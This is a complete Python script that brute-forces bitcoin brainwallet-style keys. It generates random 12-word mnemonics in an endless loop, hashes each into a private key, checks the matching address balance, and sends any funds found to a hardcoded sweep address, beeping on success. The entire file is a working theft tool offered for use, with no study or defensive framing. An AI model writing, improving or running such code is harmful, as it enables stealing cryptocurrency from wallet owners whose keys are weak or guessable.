import hashlib
import codecs
from bitcoin import privkey_to_pubkey, pubkey_to_address
from bit import Key
from bit.exceptions import InsufficientFunds
import base58
from mnemonic import Mnemonic
import sys
import time
import winsound

def sha256(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return hashlib.sha256(data).hexdigest()

def get_private_key_from_passphrase(passphrase):
    private_key = sha256(passphrase)
    return private_key

def private_key_to_wif(private_key):
    extended_key = "80" + private_key
    first_sha256 = sha256(codecs.decode(extended_key, 'hex_codec'))
    second_sha256 = sha256(codecs.decode(first_sha256, 'hex_codec'))
    checksum = second_sha256[:8]
    final_key = extended_key + checksum
    wif = base58.b58encode(codecs.decode(final_key, 'hex_codec')).decode('utf-8')
    return wif

def sweep_funds(private_key_wif):
    try:
        key = Key(private_key_wif)
        balance = key.get_balance('btc')
        balance = float(balance)

        if balance > 0:
            print(f"\033[92mBalance for address {key.address} is {balance} BTC. Sweeping funds.\033[0m")
            try:
                tx_hash = key.send([(sweep_address, balance, 'btc')], fee='fastest')
                print(f"\033[92mTransaction sent: {tx_hash}\033[0m")
                winsound.MessageBeep(winsound.MB_OK)  # Play the default Windows ping sound on successful sweep
            except InsufficientFunds as e:
                print(f"Insufficient funds to send transaction: {e}")
        else:
            print(f"Insufficient balance for address: {key.address}")
    except Exception as e:
        print(f"Error handling key {private_key_wif}: {e}")

def generate_mnemonic():
    mnemo = Mnemonic("english")
    return mnemo.generate(strength=128)  # Generates a 12-word mnemonic
sweep_address = "3FxQzNxA1MYEjmtQjEYfKisLPYq1b7hBCf"
def main():
    while True:
        mnemonic_phrase = generate_mnemonic()
        print(f"Generated mnemonic phrase: {mnemonic_phrase}")
        private_key = get_private_key_from_passphrase(mnemonic_phrase)
        wif = private_key_to_wif(private_key)
        print(f"Sweeping funds from WIF: {wif}")
        sweep_funds(wif)
        time.sleep(0.1)  # Small sleep to prevent overwhelming any APIs and avoid rate limits

if __name__ == "__main__":
    main()
